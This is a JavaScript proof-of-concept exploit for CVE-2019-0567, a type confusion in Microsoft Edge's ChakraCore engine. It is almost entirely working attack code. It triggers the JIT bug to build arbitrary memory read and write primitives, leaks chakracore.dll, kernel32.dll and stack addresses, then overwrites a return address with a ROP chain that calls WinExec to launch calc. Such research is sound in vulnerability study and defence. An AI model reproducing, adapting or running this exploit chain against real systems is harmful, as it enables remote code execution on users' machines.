// CVE-2019-0567: Microsoft Edge Type Confusion
// Author: Connor McGarr (@33y0re)

// Large object used to corrupt metadata of DataView object
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

// DataView objects used for read/write primitive
dataview1 = new DataView(new ArrayBuffer(0x100));
dataview2 = new DataView(new ArrayBuffer(0x100));

// Function to convert to hex for memory addresses
function hex(x) {
    return `${x.toString(16)}`
}

// Arbitrary read function
function read64(lo, hi) {
	dataview1.setUint32(0x38, lo, true); 		// DataView+0x38 is the buffer property
	dataview1.setUint32(0x3C, hi, true);		// First set this to the memory address we want to read from (4 bytes at a time: e.g. 0x38 and 0x3C)

	// Instead of returning a 64-bit value here, we will create a 32-bit typed array and return the entire array
	// Write primitive requires breaking the 64-bit address up into 2 32-bit values so this allows us an easy way to do this
	var arrayRead = new Uint32Array(0x10);
	arrayRead[0] = dataview2.getInt32(0, true); 	// 4-byte arbitrary read
	arrayRead[1] = dataview2.getInt32(4, true);		// 4-byte arbitrary read

	// Return the array
	return arrayRead;
}

// Arbitrary write function
function write64(lo, hi, valLo, valHi) {
	dataview1.setUint32(0x38, lo, true);
	dataview1.setUint32(0x3C, hi, true);

	// Perform the write with our 64-bit value (broken into two 4 bytes values, because of JavaScript)
	dataview2.setInt32(0, valLo, true);
	dataview2.setInt32(4, valHi, true);
}

function opt(o, proto, value) {
    o.b = 1;
    let tmp = {__proto__: proto};
    o.a = value;
}

function main() {
	for (let i = 0; i < 2000; i++) {		// JIT optimize to remove type guardrails
		let o = {a: 1, b: 2};
		opt(o, {}, {});
	}

	// Print update
	print("[+] Calling optimzed function 2000 times to trigger JIT!");

	// Cause type transition to trigger type confusion vulnerability
	let o = {a: 1, b: 2};

	// Corrupt o.auxSlots with the address of our fake object obj
	opt(o, o, obj);

	// Set o.c, which corrupts our fake object's auxSlots
	// obj.AuxSlots is now set to the first DataView object
	o.c = dataview1;

	// Corrupt the buffer property of dataview1 to point to our dataview2 object
	obj.h = dataview2;

	// Dynamic objects are as follows in memory: | vtable | type | etc.
	// We can read the vtable for the dataview1 object, which is a pointer in Chakra, by retrieving DataView[0];
	// Javascript is limited to 32-bits for values, so we have to retrieve the full 64-bit address in two steps
	// These steps will get us the address of the vtable
	vtableLo = dataview1.getUint32(0, true);
	vtableHigh = dataview1.getUint32(4, 32);

	// We are also going to store the address of the type as well
	// We will use this to bypass CFG by performing some arbitrary reads to eventually leak a stack address
	typeLo = dataview1.getUint32(8, true);
	typeHigh = dataview1.getUint32(12, true);

	// Store the base address of the image (chakracore.dll)
	chakraBase = (vtableLo + vtableHigh * 0x100000000);
	chakraBase -= 0x19604f8;

	// Print updates
	print("[+] DataView object 1 leaked vtable from ChakraCore.dll: " + "0x" + hex(vtableLo + vtableHigh * 0x100000000));
	print("[+] ChakraCore.dll base: " + "0x" + hex(chakraBase));

	// Let's read from the IAT to get a pointer to kernel32.dll (this is sufficient for our POC purposes)
	// We have to use the 32-bit "lo" version of Chakra because JavaScript
	kernel32pointerChakra = chakraBase + 0x17c0040;		// Pointer to KERNEL32!RaiseExceptionStub

	// We know that the vtable pointer we leaked is from the same address space as the IAT entry for ChakraCore
	// We can reuse the vtableLo value, which is the upper mask for the base address of chakracore.dll, since they're both in the same address space

	// "Mask off" everything but the lower 32-bits by setting a 64-bit value ona 32-bit array, so the rest of the 64-bits (e.g. the upper mask) is cut off
	var kernel32pointerLo = new Uint32Array(0x4);
	kernel32pointerLo[0] = kernel32pointerChakra;

	// Perform the arbitrary read
	// Our value is getting tagged as an integer
	kernel32Pointer = read64(kernel32pointerLo[0], vtableHigh);

	// Store the base address of kernel32 (just for printing purposes)
	// Our "real" kernel32.dll values are from kernel32Lo and kernel32High
	kernel32 = (kernel32Pointer[0] + kernel32Pointer[1] * 0x100000000);
	kernel32 -= 0x1fcb0;

	// Also go ahead and store the "low" part of kernel32.dll (will need this later for arbitrary writes) and ChakraCore
	var kernel32loArray = new Uint32Array(0x4);
	kernel32pointerLo[0] = kernel32;

	var chakrabaseloArray = new Uint32Array(0x4);
	chakrabaseloArray[0] = chakraBase;

	// -----------------------------------------------------------------------------

	// kernel32Lo now contains the "lower mask" of the base address of kernel32.dll
	kernel32Lo = kernel32pointerLo[0];

	// kernel32High now contains the "upper mask" of the base address of kernel32.dll
	kernel32High = kernel32Pointer[1];

	// chakraHigh now contains the "upper mask" of the base of chakrabase.dll (remember we leaked the vtable from chakracore earlier, so we can just re-use vtableHigh here)
	chakraHigh = vtableHigh;

	// chakraLo now contains the "lower mask" of the base of chakrabase.dll
	chakraLo = chakrabaseloArray[0];

	// -----------------------------------------------------------------------------

	// Print updates
	print("[+] ChakraCore.dll pointer to kernel32.dll: " + "0x" + hex(kernel32Pointer[1]) + hex(kernel32Pointer[0]));
	print("[+] kernel32.dll base: " + "0x" + hex(kernel32));

	// With the needed addresses in hand, we now need to redirect execution flow to gain code execution
	// We are dealing with Control Flow Guard as well (CFG)
	// CFG doesn't protect return addresses, so exploitation flow will be as follows:
	// 1. Leak the type (memory address) of our DataView object (just like we did for leaking the associated vtable pointer)
	// 2. There is a member of type called javascriptLibrary. Leak this
	// 3. javascriptLibrary has a member named scriptContext. Leak this.
	// 4. scriptContext has a member named threadContext. Leak this.
	// 5. threadContext has two stack addresses

	// Print update
	print("[+] Leaked type from DataView object 1: 0x" + hex(typeLo + typeHigh * 0x100000000));

	// Arbitrary read to get the javascriptLibrary pointer (offset of 0x8 from type)
	javascriptLibrary = read64(typeLo+8, typeHigh);

	// Arbitrary read to get the scriptContext pointer (offset 0x450 from javascriptLibrary. Found this manually)
	scriptContext = read64(javascriptLibrary[0]+0x450, javascriptLibrary[1])

	// Arbitrary read to get the threadContext pointer (offset 0x3b8)
	threadContext = read64(scriptContext[0]+0x3b8, scriptContext[1]);

	// Leak a pointer to a pointer on the stack from threadContext at offset 0xd0
	stackleakPointer = read64(threadContext[0]+0xd0, threadContext[1]);

	// Extract the pointer to the stack
	stackLeak = read64(stackleakPointer[0], stackleakPointer[1]);

	// Print update
	print("[+] type->javascriptLibrary->scriptContext->threadContext leaked stack address: 0x" + hex(stackLeak[1]) + hex(stackLeak[0]));

	// Update the lower part of stackleakPointer to actually point to the upper stack limit (the value we leak is a stack address but is still 0xf4000 bytes from the top of the stack)
	stackLeak[0] = stackLeak[0] + 0xed000

	// Print update
	print("[+] Stack limit: 0x" + hex(hex(stackLeak[1]) + hex(stackLeak[0])));

	// Let's scan the stack and see if we can't find our return address
	// Return address: chakracore+0x1769940
	// We target this return address because it is so far away on the stack that we can overwrite it before it is executed
	/*
	0:000> u chakracore+0x1769940
	chakracore!JsRun+0x40 [c:\users\anon\desktop\chakracore\lib\jsrt\jsrt.cpp @ 5059]:
	00007ffa`54e89940 4883c438        add     rsp,38h
	00007ffa`54e89944 c3              ret
	*/

	// Creating an array to store the return address because read64() returns an array of 2 32-bit values
	var returnAddress = new Uint32Array(0x4);
	returnAddress[0] = chakraLo + 0x1769940;
	returnAddress[1] = chakraHigh;

	print("[+] Target return address (chakracore!JsRun+0x40): 0x" + hex(returnAddress[1]) + hex(returnAddress[0]));

	// Counter for the stack scan 
	let counter = 0;

	// Infinite scan until we find the return address
	while (true) {

		// Store the "lower half" of the stack address in a temporary variable for offset computation
		tempStack = stackLeak[0] + counter;

		// Store the read primitive output in a variable
		readContents = read64(tempStack, stackLeak[1])

		// Do both the "lower" and "upper" parts of our target address correspond?
		if ((readContents[0] == returnAddress[0]) && (readContents[1] == returnAddress[1]))
		{
			print("[+] Found our target return address!");
			break;
		}
		else
		{
			// Increment
			counter += 0x8;			
		}
	}

	
	// Create a new array with our target return address on the stack because we need 2 32-bit values
	// We will use this with our write primtive
	var stackreturnAddress = new Uint32Array(0x4);
	stackreturnAddress[0] = tempStack;
	stackreturnAddress[1] = stackLeak[1];

	// Print update
	print("[+] Target stack address with return address to be overwritten: 0x" + hex(stackreturnAddress[1]) + hex(stackreturnAddress[0]));

	// Corrupt the return address with 0x4141414141414141 to control RIP
	//write64(stackreturnAddress[0], stackreturnAddress[1], 0x41414141, 0x41414141);

	// Storing the value of KERNEL32!WinExec (the lower part, because we already have the higher part in the variable kernelHigh)
	winExec = kernel32Lo + 0x67200;

	// From here on out we control RIP
	// Let's stand up a ROP chain to invoke calc.exe via WinExec

	// RCX: Need to create a pointer to the hex representation of calc.exe
	// RDX: 0
	// WinExec: Need to 16-byte align the stack before returning into WinExec

	// Print update
	print("[+] Writing ROP chain to the stack...");

	// Start ROP chain
	popRsi = kernel32Lo + 0x90ed;					// pop rsi ; ret (1 found) (kernel32.dll)
	write64(stackreturnAddress[0], stackreturnAddress[1], popRsi, kernel32High);

	// Write next gadget
	dataAddress = kernel32Lo + 0xb3500; 			// .data address from kernel32.dll to place the term calc
	write64(stackreturnAddress[0]+0x8, stackreturnAddress[1], dataAddress, kernel32High);

	// Write next gadget
	popRbx = kernel32Lo + 0x1398; 					// pop rbx ; ret (1 found) (kernel32.dll)
	write64(stackreturnAddress[0]+0x10, stackreturnAddress[1], popRbx, kernel32High);	

	// Write next gadget (value of calc technically)
	calc = 0x636c6163; 								// clac (calc after little endian)
	write64(stackreturnAddress[0]+0x18, stackreturnAddress[1], calc, 0x00000000);

	// Write next gadget
	movRsi = kernel32Lo + 0x1d5fc;					// 0x77f3bff418 ; mov rbx, qword [rsp+0x30] ; mov rsi, qword [rsp+0x38] ; add rsp, 0x20 ; pop rdi ; ret (1 found) (kernel32.dll)
	write64(stackreturnAddress[0]+0x20, stackreturnAddress[1], movRsi, kernel32High);

	// Padding for add rsp and pop rdi in above gadget
	write64(stackreturnAddress[0]+0x28, stackreturnAddress[1], 0x41414141, 0x41414141);
	write64(stackreturnAddress[0]+0x30, stackreturnAddress[1], 0x41414141, 0x41414141);
	write64(stackreturnAddress[0]+0x38, stackreturnAddress[1], 0x41414141, 0x41414141);
	write64(stackreturnAddress[0]+0x40, stackreturnAddress[1], 0x41414141, 0x41414141);
	write64(stackreturnAddress[0]+0x48, stackreturnAddress[1], 0x41414141, 0x41414141);

	// Write next gadget
	popRcx = chakraLo + 0x2fae2c;					// pop rcx ; ret (1 found) (chakracore.dll)
	write64(stackreturnAddress[0]+0x50, stackreturnAddress[1], popRcx, chakraHigh);

	// Write next gadget (.data address)			// .data address from kernel32.dll containing calc string
	write64(stackreturnAddress[0]+0x58, stackreturnAddress[1], dataAddress, kernel32High);

	// Write next gadget
	popRdx = chakraLo + 0x40382;					// pop rdx ; ret (1 found) (chakracore.dll)
	write64(stackreturnAddress[0]+0x60, stackreturnAddress[1], popRdx, chakraHigh);

	// Write next gadget (place 0 into RDX)
	write64(stackreturnAddress[0]+0x68, stackreturnAddress[1], 0x00000000, 0x00000000);

	// Write next gadget (ROP NOP To ensure 0x10-byte aligned stack)
	ropNop = chakraLo + 0x608fa4;
	write64(stackreturnAddress[0]+0x70, stackreturnAddress[1], ropNop, chakraHigh);

	// Print update
	print("[+] Returning into kernel32!WinExec! calc.exe incoming!");

	// Return into WinExec
	write64(stackreturnAddress[0]+0x78, stackreturnAddress[1], winExec, kernel32High);
}

main();
